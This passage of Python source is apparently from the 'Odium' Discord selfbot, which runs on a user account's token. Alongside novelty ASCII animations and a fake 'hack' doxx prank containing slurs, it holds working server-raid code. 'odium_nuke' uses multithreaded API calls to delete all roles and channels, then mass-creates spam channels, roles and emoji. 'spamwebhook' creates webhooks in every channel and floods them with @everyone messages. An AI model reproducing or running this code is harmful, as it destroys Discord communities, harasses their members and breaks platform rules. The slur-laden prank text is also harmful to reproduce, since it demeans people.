        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.\n ▀█▄▀▪▀▀▀▀▀• ▀▀▀ ▀▀▀ ▀▀  █▪▀▀▀     ▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • \n▄▄▄  ▄• ▄▌ ▐ ▄ .▄▄ ·      ▄· ▄▌      ▄• ▄▌```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.\n ▀█▄▀▪▀▀▀▀▀• ▀▀▀ ▀▀▀ ▀▀  █▪▀▀▀     ▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • \n▄▄▄  ▄• ▄▌ ▐ ▄ .▄▄ ·      ▄· ▄▌      ▄• ▄▌\n▀▄ █·█▪██▌•█▌▐█▐█ ▀.     ▐█▪██▌▪     █▪██▌```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.\n ▀█▄▀▪▀▀▀▀▀• ▀▀▀ ▀▀▀ ▀▀  █▪▀▀▀     ▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • \n▄▄▄  ▄• ▄▌ ▐ ▄ .▄▄ ·      ▄· ▄▌      ▄• ▄▌\n▀▄ █·█▪██▌•█▌▐█▐█ ▀.     ▐█▪██▌▪     █▪██▌\n▐▀▀▄ █▌▐█▌▐█▐▐▌▄▀▀▀█▄    ▐█▌▐█▪ ▄█▀▄ █▌▐█▌```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.\n ▀█▄▀▪▀▀▀▀▀• ▀▀▀ ▀▀▀ ▀▀  █▪▀▀▀     ▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • \n▄▄▄  ▄• ▄▌ ▐ ▄ .▄▄ ·      ▄· ▄▌      ▄• ▄▌\n▀▄ █·█▪██▌•█▌▐█▐█ ▀.     ▐█▪██▌▪     █▪██▌\n▐▀▀▄ █▌▐█▌▐█▐▐▌▄▀▀▀█▄    ▐█▌▐█▪ ▄█▀▄ █▌▐█▌\n▐█•█▌▐█▄█▌██▐█▌▐█▄▪▐█     ▐█▀·.▐█▌.▐▌▐█▄█▌```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.\n ▀█▄▀▪▀▀▀▀▀• ▀▀▀ ▀▀▀ ▀▀  █▪▀▀▀     ▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • \n▄▄▄  ▄• ▄▌ ▐ ▄ .▄▄ ·      ▄· ▄▌      ▄• ▄▌\n▀▄ █·█▪██▌•█▌▐█▐█ ▀.     ▐█▪██▌▪     █▪██▌\n▐▀▀▄ █▌▐█▌▐█▐▐▌▄▀▀▀█▄    ▐█▌▐█▪ ▄█▀▄ █▌▐█▌\n▐█•█▌▐█▄█▌██▐█▌▐█▄▪▐█     ▐█▀·.▐█▌.▐▌▐█▄█▌\n.▀  ▀ ▀▀▀ ▀▀ █▪ ▀▀▀▀       ▀ •  ▀█▄▀▪ ▀▀▀ ```"
    )
    for i in list:
        await ctx.message.edit(content=i)

@Odium.command()
async def faketoken(ctx, user: discord.User = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))

@Odium.command()
async def hack(ctx, user: discord.User = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")

async def delr(ctx):
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{Fore.RED}[-] {Fore.WHITE}Role Deleted: {role}" + Fore.RESET)
        except:
            pass

def containing(a, b):
    for c in a:
        if c.name.lower() == b.lower() or str(c.id) == b:
            return c
    return None

def isDM(ctx):
    return isinstance(ctx.channel, discord.channel.DMChannel)

@Odium.command(name='connect', aliases=['con'])
async def connect(ctx, *, server=None):
    if server is None and ctx.guild is None:
        await print(ctx, f'Providing a server name is required.')
        return

    if server is None and not isDM(ctx):
        server = ctx.guild
    else:
        temp_name = server
        server = containing(Odium.guilds, server)
        if server is None:
            await print(ctx, f'Unable to find {temp_name} server.')
            return

    global selected_server
    selected_server = server
    await print(ctx, f'Successfully connected to `{server.name}`.')

def nooooourrolesgotnukedomg(idofguild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        make = requests.post(f"https://discord.com/api/v8/guilds/{idofguild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":0xff0000,"mentionable":"true"})
    except:
        pass

def nooooourchannelsgotnukedomg(idofguild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass

def deletionofachannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
    except:
        pass

def deletionofarole(idoftheguild,roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v8/guilds/{idoftheguild}/roles/{roledetails}",headers=headers)
    except:
        pass

@Odium.command()
async def odium_nuke(ctx): # b'\xfc'
    await ctx.message.delete()
    amountofthemtomake = 250
    nameofthem = "ran-by-odium"
    for rol in ctx.guild.roles:
        threading.Thread(target=deletionofarole, args=(ctx.guild.id, rol.id,)).start()
        print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Role: {rol}")
    for chan in ctx.guild.channels:
        threading.Thread(target=deletionofachannel, args=(chan.id,)).start()
        print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Channel: {chan}")
        sleep(0.1)
    for i in range(int(amountofthemtomake)):
        threading.Thread(target=nooooourchannelsgotnukedomg, args=(ctx.guild.id, nameofthem,)).start()
        threading.Thread(target=nooooourrolesgotnukedomg, args=(ctx.guild.id, nameofthem,)).start()
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Channel: {nameofthem}")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Role: {nameofthem}")
        sleep(0.1)
    await ctx.guild.edit(
        name="RanByOdium",
        description="RanByOdiumSelfBot",
        reason="https://discord.gg/KqMccvSF",
        icon=None,
        banner=None
    )
    with open("Other/odium-emoji.jpg", "rb") as f:
        img1 = f.read()

    sijome = [img1]
    for i in range(50):
        try:
            randemoj = random.choice(sijome)
            randomemojiname = "OdiumRunsYou"
            for scale in range(32):
                await ctx.guild.create_custom_emoji(name="OdiumRunsYou", image=randemoj)
        except:
            pass
    Clear()
    startprint()


def ssspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:

        randcolor = random.randint(0x000000, 0xFFFFFF)
        data = {
            "content": "@everyone **Nuked Using Odium Selfbot**\nhttps://dsc.gg/odiumsec",
            "embeds": [
                {
                    "title": "Nuked Using Odium Selfbot",
                    "tts": "true",
                    "description": "Ran By Odium Security\nhttps://dsc.gg/odiumsec",
                    "url": "https://www.youtube.com/watch?v=AuMSQ7NThRM&t=108s",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "Ran By Odium Security | dsc.gg/odiumsec",
                            "value": "Where There Is Light, There Are Also Shadows | dsc.gg/odiumsec"
                        }
                    ],
                    "author": {
                        "name": "Odium",
                        "url": "https://cdn.discordapp.com/attachments/855105819188133948/856059644719923220/logoDone.png",
                        "icon_url": "https://cdn.discordapp.com/attachments/855105819188133948/856059644719923220/logoDone.png"
                    },
                    "footer": {
                        "text": "Odium Selfbot By MajorRhine",
                        "icon_url": "https://cdn.discordapp.com/attachments/855105819188133948/856059786747576351/2.png"
                    },
                    "image": {
                        "url": "https://cdn.discordapp.com/attachments/855105819188133948/856059644719923220/logoDone.png"
                    }
                }
            ],
            "username": "Odium Selfbot",
            "avatar_url": "https://cdn.discordapp.com/attachments/855105819188133948/856059644719923220/logoDone.png"
        }

        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass

        elif "rate limited" in spammingerror.lower():

            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(5, 10)
                time.sleep(delay)
        else:
            delay = random.randint(30, 60)
            time.sleep(delay)

@Odium.command()
async def spamwebhook(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:  # nuked with existing ones too!
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1  # +1 just in case any errors idk
    for i in range(
            webhookamount):
        for channel in ctx.guild.text_channels:

            try:

                webhook = await channel.create_webhook(name='Nuked Using Odium Security')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open(r'Other/Webhooks/webhooks-' + str(ctx.guild.id) + ".txt", 'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                pass

@Odium.command()
async def tinyurl(ctx, *, link):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False)
    await ctx.send(embed=em)

@Odium.command(aliases=['slots', 'bet'])
async def slot(ctx):  # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))

@Odium.command()
async def backupfriends(ctx):  # b'\xfc'
    await ctx.message.delete()
    for friend in Odium.user.friends:
        friendlist = (friend.name) + '#' + (friend.discriminator)
        with open('Backups/friends.txt', 'a+') as f:
            f.write(friendlist + "\n")
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Friend {friend} To friends.txt")
    for block in Odium.user.blocked:
        blocklist = (block.name) + '#' + (block.discriminator)
        with open('Backups/blocked.txt', 'a+') as f:
            f.write(blocklist + "\n")
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Blocked User {friend} To blocked.txt")

@Odium.command()
async def dmfriends(ctx, message):  # b'\xfc'
    await ctx.message.delete()
    for friend in Odium.user.friends:
        friendlist = (friend.name) + '#' + (friend.discriminator)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Friend {friend} To friends.txt")

@Odium.command()
async def portscan(ctx, ip):
    scanyuh = requests.get(f"https://api.hackertarget.com/nmap/?q={ip}")
    result = scanyuh.text.strip("( https://nmap.org/ )")
    embed = discord.Embed(color=0xff0000)
    embed.add_field(name='Odium Selfbot', value=f'{result}', inline=False)
    embed.set_footer(text=f'Port Scan | Requested By {ctx.author}', icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@Odium.command()
async def boom( ctx):
    list = (
        "```THIS MESSAGE WILL SELFDESTRUCT IN 5```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 4```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 3```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 2```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 1```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 0```",
        "💣",
        "💥",
    )
    for i in list:
        await asyncio.sleep(1.5)
        await ctx.message.edit(content=i)

@Odium.command()
async def odiumslide( ctx):
    list = (
        "```e```",
        "```ne```",
        "```ine```",
        "```hine```",
        "```Rhine```",
        "```rRhine```",
        "```orRhine```",
        "```jorRhine```",
        "```ajorRhine```",
        "```MajorRhine```",
        "``` MajorRhine```",
        "```y MajorRhine```",
        "```by MajorRhine```",
        "``` by MajorRhine```",
        "```t by MajorRhine```",
        "```ot by MajorRhine```",
        "```bot by MajorRhine```",
        "```fbot by MajorRhine```",
        "```lfbot by MajorRhine```",
        "```elfbot by MajorRhine```",
        "```Selfbot by MajorRhine```",
        "``` Selfbot by MajorRhine```",
        "```m Selfbot by MajorRhine```",
        "```um Selfbot by MajorRhine```",
        "```ium Selfbot by MajorRhine```",
        "```dium Selfbot by MajorRhine```",
        "```Odium Selfbot by MajorRhine```",
        "``` Odium Selfbot by MajorRhine```",
        "```  Odium Selfbot by MajorRhine```",
        "```   Odium Selfbot by MajorRhine```",
        "```    Odium Selfbot by MajorRhin```",
        "```     Odium Selfbot by MajorRhi```",
        "```      Odium Selfbot by MajorRh```",
        "```       Odium Selfbot by MajorR```",
        "```        Odium Selfbot by Major```",
        "```         Odium Selfbot by Majo```",
        "```          Odium Selfbot by Maj```",
        "```           Odium Selfbot by Ma```",
        "```             Odium Selfbot by ```",
        "```              Odium Selfbot by```",
        "```               Odium Selfbot b```",
        "```                Odium Selfbot ```",
        "```                 Odium Selfbot```",
        "```                  Odium Selfbo```",
        "```                   Odium Selfb```",
        "```                    Odium Self```",
        "```                     Odium Sel```",
        "```                      Odium Se```",
        "```                       Odium S```",
        "```                        Odium ```",
        "```                         Odium```",
        "```                          Odiu```",
        "```                           Odi```",
        "```                            Od```",
        "```                             O```",
        "```                              ```",
        "```       dsc.gg/odiumsec        ```",
    )
    for i in list:
        await asyncio.sleep(1)
        await ctx.message.edit(content=i)

@Odium.command()
async def tree(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░░░▌░░░░░░░▐\n░░░░█░░▄▌░░░░▌░░░█░░░▄▄\n░░░░▐▄░▌░░░░▐▄▌░░░▀▄█▄\n░░░░░▐█░░░░░░░▌░▄█▀░░░▀█\n░░░▌░░▐░░░░░▄▀▀▀░░░░░░░░\n░░░▐░░░▀▄░█▀▄▄▄▄░░░░░░░░\n▌░░█▄░░░▐▄█░░░░▌▀▄░░░░░░\n█░░░▐░░░██░░░░░█░░▄░█▀░░\n▐░░░█░░░▐█░░░░░░░░▌▀░░░░\n░▌░░▌░░░▐█▄░░░░▄▄█▄▄▄░░░\n▄▄▀▄█░░░░██░▄█▀░█▄▄░▐▄▄░\n░░░░▀█▄░▄███░░░░░░░░░░░░\n░░░░░░█████░░░░░░░░░░░░░\n░░░░░░░▐███░░░░░░░░░░░░░\n░░░░░░░▐███░░░░░░░░░░░░░\n░░░░░░░▐████░░░░░░░░░░░░\n░░▒▒▒▒▒█████▒▒░░░░░░░░░░\n▒▒▒▒▒▒▄██████▒▒▒▒▒▒▒▒▒▒▒\n▒▒▄▄▄█▀▒█▀▐▀▀██▄▄▄▒▒▒▒▒▒\n█▀▐▒█▒▒▒▌▒▒▐▒▒▒▒▒▌▀▀▄▒▒▒")

@Odium.command()
async def island(ctx):
    await ctx.message.delete()
    await ctx.send("──────────────────────────────────\n─────────▄▄───────────────────▄▄──\n──────────▀█───────────────────▀█─\n──────────▄█───────────────────▄█─\n──█████████▀───────────█████████▀─\n───▄██████▄─────────────▄██████▄──\n─▄██▀────▀██▄─────────▄██▀────▀██▄\n─██────────██─────────██────────██\n─██───██───██─────────██───██───██\n─██────────██─────────██────────██\n──██▄────▄██───────────██▄────▄██─\n───▀██████▀─────────────▀██████▀──\n──────────────────────────────────\n──────────────────────────────────\n──────────────────────────────────\n───────────█████████████──────────\n──────────────────────────────────\n──────────────────────────────────")

@Odium.command()
async def eyes(ctx):
    await ctx.message.delete()
    await ctx.send("─────────█▄██▄█\n█▄█▄█▄█▄█▐█┼██▌█▄█▄█▄█▄█\n███┼█████▐████▌█████┼███\n█████████▐████▌█████████")

@Odium.command()
async def castle(ctx):
    await ctx.message.delete()
    await ctx.send("─────────█▄██▄█\n█▄█▄█▄█▄█▐█┼██▌█▄█▄█▄█▄█\n███┼█████▐████▌█████┼███\n█████████▐████▌█████████")

@Odium.command()
async def truck(ctx):
    await ctx.message.delete()
    await ctx.send("──────▄▌▐▀▀▀▀▀▀▀▀▀▀▀▀▌\n───▄▄██▌█░░░░░░░░░░░░▐\n▄▄▄▌▐██▌█░░░░░░░░░░░░▐\n▀❍▀▀▀▀▀▀▀❍❍▀▀▀▀▀▀❍❍▀")

@Odium.command()
async def glasses(ctx):
    await ctx.message.delete()
    await ctx.send("█──██████────██████──█\n█─██────██──██────██─█\n─███─██─██████─██─███\n──██────██──██────██\n───██████────██████")

@Odium.command()
async def doggo(ctx):
    await ctx.message.delete()
